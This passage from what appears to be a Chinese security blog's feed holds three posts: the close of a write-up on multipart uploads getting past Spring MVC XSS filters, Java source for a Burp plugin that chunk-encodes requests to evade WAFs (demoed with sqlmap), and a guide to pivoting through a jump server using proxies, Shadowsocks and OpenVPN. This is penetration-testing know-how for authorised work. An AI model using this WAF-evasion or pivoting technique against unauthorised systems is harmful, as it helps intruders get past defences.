MVC针对Tomcat解析的结果—原生<code>HttpServletRequest</code>，使用<code>common-fileupload.jar</code>来继续解析，得到<code>MultipartHttpServletRequest</code>的实现对象。<code>DefaultMultipartHttpServletRequest</code>类实现了<code>MultipartHttpServletRequest</code>，故通过该类的<code>getParameterValues()</code>方法即可获取到上传POST请求的参数值！</p><p><strong>最后特别说明一点，其实上传POST请求数据是流经过过滤器的。没有被过滤，是由于获取参数值的时候，没有调用过滤器Wrapper对象的方法。所以最终我们看到了上传包可以“绕过”过滤器检查的现象。</strong></p><h2 id="0x05-最后的思考"><a href="#0x05-最后的思考" class="headerlink" title="0x05 最后的思考"></a>0x05 最后的思考</h2><p>在文章发布区，评论区，公告区….等功能点上常常需要上传图片或附件，这时表单往往会以上传包的形式提交数据。而这些功能点也是hack们最关注的XSS漏洞测试点，若不注意上传包可”绕过”过滤器的问题，会造成很严重的后果！</p><p>我从新翻开了之前审计的项目代码，发现很多Spring MVC项目都是使用过滤器对XSS和SQL注入进行全局防御。而过滤器的代码与本文例子的中过滤器代码相似，很明显都是从网上Copy过来的。这样编写代码是存在问题的，针对这种情况，我们该如何正确防御，我们下周文章详述！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;月初和southwind0师傅做代码审计时，发现了一个比较奇葩的问题。系统设置了全局
      
    
    </summary>
    
      <category term="代码审计" scheme="http://gv7.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>编写Burp分块传输插件绕WAF</title>
    <link href="http://gv7.me/articles/2019/chunked-coding-converter/"/>
    <id>http://gv7.me/articles/2019/chunked-coding-converter/</id>
    <published>2019-03-15T02:37:13.000Z</published>
    <updated>2019-03-31T15:21:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>分块传输绕WAF在年初的<a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">《利用分块传输吊打所有WAF》</a>中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入<code>Transfer-Encoding: chunked</code>HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！</p><a id="more"></a><h2 id="0x01-功能设计"><a href="#0x01-功能设计" class="headerlink" title="0x01 功能设计"></a>0x01 功能设计</h2><p>我们先来看看插件要实现的功能</p><ol><li>在Burp Repeater套件上可对数据包进行快速chunked解码编码</li><li>自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码</li><li>可设置分块长度，是否开启注释</li></ol><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>限于边幅，我只说明核心函数，并通过注释的方式解释代码的相关功能。</p><h4 id="2-1-编码函数"><a href="#2-1-编码函数" class="headerlink" title="2.1 编码函数"></a>2.1 编码函数</h4><p>这是我们的核心函数，对各个套件数据HTTP数据进行<code>chunked</code>编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">byte</span>[] encoding(IExtensionHelpers helpers, IHttpRequestResponse requestResponse, <span class="keyword">int</span> split_len, <span class="keyword">boolean</span> isComment) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = requestResponse.getRequest();</span><br><span class="line">IRequestInfo requestInfo = helpers.analyzeRequest(request);</span><br><span class="line"><span class="keyword">int</span> bodyOffset = requestInfo.getBodyOffset();</span><br><span class="line"><span class="keyword">int</span> body_length = request.length - bodyOffset;</span><br><span class="line">String body = <span class="keyword">new</span> String(request, bodyOffset, body_length, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">// 对长度大于10000的数据包，不处理</span></span><br><span class="line"><span class="keyword">if</span> (request.length - bodyOffset &gt; <span class="number">10000</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对数据包进行编码处理</span></span><br><span class="line">List&lt;String&gt; str_list = Util.getStrList(body,Config.splite_len);</span><br><span class="line">String encoding_body = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>(String str:str_list)&#123;</span><br><span class="line"><span class="keyword">if</span>(Config.isComment)&#123;</span><br><span class="line">encoding_body += String.format(<span class="string">"%s;%s"</span>,Util.decimalToHex(str.length()),Util.getRandomString(<span class="number">10</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">encoding_body += Util.decimalToHex(str.length());</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">encoding_body += str;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"0\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在数据包中添加Transfer-Encoding: chunked头</span></span><br><span class="line">List&lt;String&gt; headers = helpers.analyzeRequest(request).getHeaders();</span><br><span class="line">Iterator&lt;String&gt; iter = headers.iterator();</span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line"><span class="keyword">if</span> (((String)iter.next()).contains(<span class="string">"Transfer-Encoding"</span>)) &#123;</span><br><span class="line">iter.remove();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">headers.add(<span class="string">"Transfer-Encoding: chunked"</span>);</span><br><span class="line"><span class="keyword">return</span> helpers.buildHttpMessage(headers,encoding_body.getBytes());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自动编码其他模块的数据包，我们可以通过实现Burp的<code>IHttpListener</code>，<code>IProxyListener</code>这两个接口，分别实现<code>processHttpMessage()</code>，<code>processProxyMessage()</code>这两个方法。</p><p>这里注意一个问题，Burp的所有模块的HTTP流量都会经过<code>IHttpListener.processHttpMessage()</code>这个方法，但是如果在这里处理数据包的话，Burp Proxy模块的数据包被修改之后,不会在Proxy套件UI界面显示修改后的流量，故Proxy模块流量处理单独使用<code>IProxyListener.processProxyMessage()</code>。</p><h4 id="2-2-自动编码Proxy套件的流量"><a href="#2-2-自动编码Proxy套件的流量" class="headerlink" title="2.2 自动编码Proxy套件的流量"></a>2.2 自动编码Proxy套件的流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processProxyMessage</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> messageIsRequest, <span class="keyword">final</span> IInterceptedProxyMessage proxyMessage)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IHttpRequestResponse messageInfo = proxyMessage.getMessageInfo();</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"><span class="comment">//只对Content-Typt头为application/x-www-form-urlencode的POST包进行编码</span></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//使用encoding方法对原请求包进行chunked编码</span></span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//将原HTTP请求包替换为chunked编码后的请求包</span></span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量"><a href="#2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量" class="headerlink" title="2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量"></a>2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processHttpMessage</span><span class="params">(<span class="keyword">int</span> toolFlag, <span class="keyword">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Proxy套件流量不处理，否则会出现两次编码问题，其余套件均在这里处理。</span></span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(toolFlag) &amp;&amp; (toolFlag != IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的代码，已经上传github，地址如下：</p><p><a href="http://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">http://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x03-效果演示"><a href="#0x03-效果演示" class="headerlink" title="0x03 效果演示"></a>0x03 效果演示</h2><h4 id="3-1-演示一：快速编码解码"><a href="#3-1-演示一：快速编码解码" class="headerlink" title="3.1 演示一：快速编码解码"></a>3.1 演示一：快速编码解码</h4><p>在Burp repeater套件可以快速对请求内容进行chunked编码解码，来对WAF进行测试。</p><p><img src="/articles/2019/chunked-coding-converter/repeater-chunked-coding.gif" alt="快速编码解码对WAF进行测试"></p><h4 id="3-2-演示二：搭配sqlmap进行sql注入"><a href="#3-2-演示二：搭配sqlmap进行sql注入" class="headerlink" title="3.2 演示二：搭配sqlmap进行sql注入"></a>3.2 演示二：搭配sqlmap进行sql注入</h4><p>sqlmap代理到Burp中，插件对Proxy套件的流量进行编码处理，来绕过waf。</p><p><img src="/articles/2019/chunked-coding-converter/sqlmap-bypassWAF.gif" alt="搭配sqlmap绕waf"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;分块传输绕WAF在年初的&lt;a href=&quot;https://www.anquanke.com/post/id/169738&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《利用分块传输吊打所有WAF》&lt;/a&gt;中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入&lt;code&gt;Transfer-Encoding: chunked&lt;/code&gt;HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>突破内网渗透中的访问策略限制</title>
    <link href="http://gv7.me/articles/2019/break-through-lan-segment-limit/"/>
    <id>http://gv7.me/articles/2019/break-through-lan-segment-limit/</id>
    <published>2019-02-25T10:50:11.000Z</published>
    <updated>2019-03-15T03:38:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。</p><h2 id="0x01-场景说明"><a href="#0x01-场景说明" class="headerlink" title="0x01 场景说明"></a>0x01 场景说明</h2><p>在做安服驻场时，连入客户内网对另一网段的站点进行渗透。有可能会遇到这种情况，虽然连入了客户内网，但无法直接访问目标站点。因为客户内网做了访问策略限制，不同网段无法直接连通。往往需要通过客户提供的跳板服务器去访问，大概的网络示意图如下：</p><p><img src="/articles/2019/break-through-lan-segment-limit/network.png" alt="网络示意图"></p><p>我们当然可以在跳板服务器上装好java环境，方便运行比配的Burp Suite。安装python环境，运行常用的渗透辅助脚本。同时如果你还需要其他工具，得一个一个复制到服务器上……这将非常的繁琐！</p><p><strong>那不能通过某种方法可以使得我们的笔记本直接访问的目标站点呢？</strong>，这样就不用拷贝工具到服务器上了，毕竟还是自己的笔记本渗透舒适。本文就是用于解决这个问题。</p><h2 id="0x02-方案一-HTTP代理"><a href="#0x02-方案一-HTTP代理" class="headerlink" title="0x02 方案一: HTTP代理"></a>0x02 方案一: HTTP代理</h2><h3 id="2-1-跳板服务器配置"><a href="#2-1-跳板服务器配置" class="headerlink" title="2.1 跳板服务器配置"></a>2.1 跳板服务器配置</h3><p>在跳板服务器上搭建Http(s)代理服务器，由于比较简单，就不具体说明如何搭建了。</p><h3 id="2-2-笔记本配置"><a href="#2-2-笔记本配置" class="headerlink" title="2.2 笔记本配置"></a>2.2 笔记本配置</h3><p>在客户端的浏览器上配置好代理，即可访问目标站点了。</p><h3 id="2-3-方案缺点"><a href="#2-3-方案缺点" class="headerlink" title="2.3 方案缺点"></a>2.3 方案缺点</h3><p>只能支持Http协议数据的转发，无法代理其他协议。导致我们无法测试目标站点的其他端口。下个方案我们来解决这个问题。</p><h2 id="0x03-方案二：Shadowsocks"><a href="#0x03-方案二：Shadowsocks" class="headerlink" title="0x03 方案二：Shadowsocks"></a>0x03 方案二：Shadowsocks</h2><p>我们往往都是使用Shadowsocks来FQ，其实这种场景也是可以利用<code>Shadowsocks</code>来解决的。</p><h3 id="3-1-跳板服务器配置"><a href="#3-1-跳板服务器配置" class="headerlink" title="3.1 跳板服务器配置"></a>3.1 跳板服务器配置</h3><p>Shadowsocks有python版，nodejs版，go版和exe版。由于我们得到的跳板机一般为Windows，故这里选择绿色单exe版Shadowsocks,方便携带移动。下载地址如下：</p><p><a href="https://github.com/shadowsocks/libQtShadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks</a></p><p>新建以下两个文件，内容分别如下：</p><p><strong>shadowsock.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line"><span class="attr">"server_port"</span>:<span class="number">8388</span>,</span><br><span class="line"><span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line"><span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line"><span class="attr">"password"</span>:<span class="string">"123456"</span>,</span><br><span class="line"><span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line"><span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line"><span class="attr">"workers"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>shadowsock-server.bat</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure><p>将以上两个文件放到与<code>shadowsocks-libqss.exe</code>文件同目录，双击运行该bat脚本，即可在服务器上一键启动Shadowsocks了！</p><h3 id="3-2-笔记本配置"><a href="#3-2-笔记本配置" class="headerlink" title="3.2 笔记本配置"></a>3.2 笔记本配置</h3><p>在我们的笔记本Shadowsocks客户端进行如下设置，即可连接到Shadowsocks服务器。</p><p><img src="/articles/2019/break-through-lan-segment-limit/shadowsock-client-config.png" alt="ss客户端配置"></p><p>在渗透时只需要将浏览器,burp等工具代理到<code>127.0.0.1:1080</code>，即可访问到我们的目标站点了。</p><p>注意：只有实现了http(s)/socks5功能或者使用系统代理的工具才能使用Shadowsocks！</p><h3 id="3-3-方案缺点"><a href="#3-3-方案缺点" class="headerlink" title="3.3 方案缺点"></a>3.3 方案缺点</h3><p>如果某个渗透测试工具本身没有http(s)/socks5代理功能，那该怎么办？也许有的朋友可能会想到使用<code>Proxifier/Sockcap</code>这类软件，来为这些软件进程“添加”代理功能。但是由于ss需要在本地有客户端，故在本地再使用Proxifier/Sockcap会出现流量传输死循环的情况。下个方案我们来解决这个问题。</p><h2 id="0x04-方案三：SOCKS5代理-Proxifier-Sockcap"><a href="#0x04-方案三：SOCKS5代理-Proxifier-Sockcap" class="headerlink" title="0x04 方案三：SOCKS5代理+Proxifier/Sockcap"></a>0x04 方案三：SOCKS5代理+Proxifier/Sockcap</h2><h3 id="4-1-跳板服务器配置"><a href="#4-1-跳板服务器配置" class="headerlink" title="4.1 跳板服务器配置"></a>4.1 跳板服务器配置</h3><p>这里我们使用绿色单exe版SOCKS5代理服务器软件goproxy，项目地址如下：</p><p><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p><p>在跳板服务器上，使用以下命令即可快速启动SOCKS5代理服务。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy.exe socks -t tcp -p "<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">38080</span>"</span><br></pre></td></tr></table></figure><h3 id="4-2-笔记本配置"><a href="#4-2-笔记本配置" class="headerlink" title="4.2 笔记本配置"></a>4.2 笔记本配置</h3><p>在本机使用Proxifier将需要代理的工具设置好代理，当然如果该工具有代理功能就不用了。</p><p><img src="/articles/2019/break-through-lan-segment-limit/add-socks5-server.png" alt="添加代理服务器"></p><p><img src="/articles/2019/break-through-lan-segment-limit/add-proxy-rules.png" alt="添加代理规则"></p><h3 id="4-3-方案缺点"><a href="#4-3-方案缺点" class="headerlink" title="4.3 方案缺点"></a>4.3 方案缺点</h3><ol><li>渗透中需要使用的工具，我们得一一为它们设置好代理，比较繁琐。</li><li>有些工具，你为它设置代理后，依然不能用，比如nmap。</li></ol><p>下个方案我们来解决这些问题。</p><h2 id="0x05-方案四：VPN"><a href="#0x05-方案四：VPN" class="headerlink" title="0x05 方案四：VPN"></a>0x05 方案四：VPN</h2><p>以上方案，优点很明显，缺点也很明显。为了实现对目标站点的全端口渗透无疑最好的方案是将跳板服务器搭建成VPN服务器了，然后笔记本直接通过VPN来访问目标站点，其他无需设置。即可使得所有工具都能访问到目标站点服务器的所有端口。</p><h3 id="5-1下载安装"><a href="#5-1下载安装" class="headerlink" title="5.1下载安装"></a>5.1下载安装</h3><p>去官网下载OpenVPN(我下载是openvpn-install-2.3.10-I601-x86_64.exe)，并在客户端和服务器按照以下同样的方式安装OpenVPN。安装过程没啥好说的，主要注意到以下这一步时，要选择红方框中的两个选项，不然安装完无法使用命令行制作证书。</p><p><img src="/articles/2019/break-through-lan-segment-limit/install-setting.png" alt="OpenVPN安装时需要选择的两项"></p><p>安装完成后系统会多出一张网卡TAP-Windows Adapter V9。</p><h3 id="5-2-系统设置"><a href="#5-2-系统设置" class="headerlink" title="5.2 系统设置"></a>5.2 系统设置</h3><p>设置跳板服务器用于访问目标站点的网卡共享给OpenVPN的虚拟网卡<code>TAP-Windows Adapter V9</code>，这步很重要！</p><p><img src="/articles/2019/break-through-lan-segment-limit/shared-network-card.png" alt="设置网卡共享"></p><p>网上说需要修改注册表，测试发现不改也行，这里做个记录，说不定有的环境需要。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</span><br><span class="line">将IPEnableRouter改为1</span><br></pre></td></tr></table></figure><h3 id="5-3-生成VPN证书"><a href="#5-3-生成VPN证书" class="headerlink" title="5.3 生成VPN证书"></a>5.3 生成VPN证书</h3><p><strong>&lt;1&gt; 初始化配置</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init-config</span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt; 复制配置文件为批处理</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars</span><br></pre></td></tr></table></figure><p><strong>&lt;3&gt; 清除key文件夹内的文件,文件夹不存在会自动创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clean-all</span><br></pre></td></tr></table></figure><p><strong>&lt;4&gt; 生成证书及key，需要填写一些参数，建议不要默认</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-ca</span><br></pre></td></tr></table></figure><p><strong>&lt;5&gt; 创建服务端证书及key，需要填写一些参数，建议不要默认，一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key-server server</span><br></pre></td></tr></table></figure><p><strong>&lt;6&gt; 创建一个客户端证书及key，需要填写一些参数，建议不要默认,一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key client</span><br></pre></td></tr></table></figure><p><strong>&lt;7&gt; 生成1024bit的key（pem文件），并结束此次创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-dh</span><br></pre></td></tr></table></figure><p>将新生成的<code>keys</code>目录下所有文件，全部拷贝到服务器OpenVPN的config目录下，<br>将keys目录下的<code>client1.crt</code>,<code>client1.key</code>和<code>ca.crt</code>复制到客户端的OpenVPN的config目录下。</p><h3 id="5-4-编写服务端和客户端连接配置文件"><a href="#5-4-编写服务端和客户端连接配置文件" class="headerlink" title="5.4 编写服务端和客户端连接配置文件"></a>5.4 编写服务端和客户端连接配置文件</h3><p>在服务器上，在OpenVPN的sample-config目录下复制一个<code>server.ovpn</code>配置模板文件，到config目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPN服务器的地址</span></span><br><span class="line">local <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span></span><br><span class="line"><span class="comment"># 使用tcp协议</span></span><br><span class="line">proto tcp</span><br><span class="line"><span class="comment"># 将目标站点所在的网段，写成路由推送给VPN客户端</span></span><br><span class="line">push <span class="string">"route 10.0.3.0 255.255.255.0"</span></span><br><span class="line"><span class="comment"># 给VPN客户端推送的DNS（在内网一般不用写）</span></span><br><span class="line">push <span class="string">"dhcp-option DNS 114.114.114.114"</span></span><br><span class="line"><span class="comment"># build-dh命令生成的是1024位的pem文件</span></span><br><span class="line">dh dh1024.pem</span><br></pre></td></tr></table></figure><p>在客户端，在OpenVPN的<code>sample-config</code>目录下复制一个<code>client.ovpn</code>配置模板文件，到<code>config</code>目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程VPN服务器地址</span></span><br><span class="line">remote <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span> <span class="number">1194</span></span><br><span class="line"><span class="comment"># 使用TCP协议，与服务端相同</span></span><br><span class="line">proto tcp</span><br></pre></td></tr></table></figure><p>最后先启动服务器端，右键托盘图标&gt;connect，小图标变绿色代表启动成功，若不成功可以查看下log日志，排查下原因。然后再启动客户端，操作一致。</p><h3 id="5-5-方案缺点"><a href="#5-5-方案缺点" class="headerlink" title="5.5 方案缺点"></a>5.5 方案缺点</h3><p>配置相对比较繁琐。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>这些方案我特意选择了比较简单易用的软件，并作了一个记录。方便自己某时需要，能快速突破限制，节省渗透时间。同时解决方案中推荐的软件在Linux上也有，搭建的方式类似。每个方案有优点也有缺点，大家要看自己在现场的实际需求来选择！</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.librehat.com/three-minutes-to-set-up-shadowsocks-server-on-windows/" target="_blank" rel="noopener">Windows下三分钟搭建Shadowoscks服务器端</a></li><li><a href="https://www.i5seo.com/shadowsocks-sock5-pac-vpn-difference-between.html" target="_blank" rel="noopener">Shadowsocks（Sock5代理）的PAC模式与全局模式与VPN的区别</a></li><li><a href="http://www.fyluo.com/m/?post=198" target="_blank" rel="noopener">OpenVPN Windows 平台安装部署教程</a></li><li><a href="https://www.landui.com/help/show-3871.html" target="_blank" rel="noopener">windows下利用OpenVPN搭建VPN服务器</a></li><li><a href="https://www.cnblogs.com/lidabo/p/7027463.html" target="_blank" rel="noopener">OpenVPN 安装、配置客户端和服务端，以及OpenVPN的使用 (Windows 平台)</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/9657039.html" target="_blank" rel="noopener">OpenVPN搭建中tap与tun的实际使用区别</a></li><li><a href="http://blog.shell909090.org/blog/archives/2724/" target="_blank" rel="noopener">openvpn的几种基本模式</a></li><li><a href="https://www.ilanni.com/?p=9847" target="_blank" rel="noopener">烂泥：openvpn配置文件详解</a></li><li><a href="https://www.ilanni.com/?p=9877" target="_blank" rel="noopener">烂泥：openvpn tun模式下客户端与内网机器通信</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。&lt;/p&gt;
&lt;h2 id=&quot;0x01-场景说明&quot;&gt;&lt;a href=&quot;#0x01-场景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 场景说明&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://gv7.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Java XXE漏洞正确修复方法及原理</title>
